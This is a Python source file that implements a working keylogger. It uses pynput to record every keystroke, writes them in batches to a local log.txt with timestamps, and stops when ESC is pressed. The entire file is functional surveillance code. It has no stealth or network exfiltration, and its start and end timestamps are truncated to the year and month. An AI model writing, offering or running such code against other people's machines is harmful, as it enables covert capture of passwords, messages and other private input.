"""
Keylogger Module
A standalone keylogger implementation that captures and logs keystrokes.
"""

from pynput.keyboard import Listener, Key
from datetime import datetime
import time
import os

# Global variables for keylogger state
count = 0
keys = []
last_key_time = None

# Initialize log file path
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, "log.txt")

def on_press(key):
    """Handle key press events and log them to file.
    
    Args:
        key: The key that was pressed
    """
    global keys, count, last_key_time
    current_time = time.time()
    
    # Add timestamp for new entries after 4 seconds of inactivity
    if last_key_time is not None and (current_time - last_key_time) >= 4:
        with open(log_file, "a") as f:
            f.write("\n[" + str(datetime.now())[:19] + "] ")
    
    last_key_time = current_time
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    """Handle key release events.
    
    Args:
        key: The key that was released
    
    Returns:
        bool: False if ESC key is pressed (stops the listener)
    """
    if key == Key.esc:
        return False
    
def write_file(keys):
    """Write captured keystrokes to the log file.
    
    Args:
        keys: List of captured keystrokes
    """
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write("[" + k + "]")

if __name__ == "__main__":
    # Initialize log file with start timestamp
    with open(log_file, "a") as f:
        f.write("Keylogger Started at " + (str(datetime.now()))[:+7] + "\n")
    
    # Start the keylogger listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Add end timestamp when keylogger stops
    with open(log_file, "a") as f:
        f.write("\nKeylogger Ended at " + (str(datetime.now()))[:+7] + "\n")
        f.write("-----------------------------------------------------------------------------") 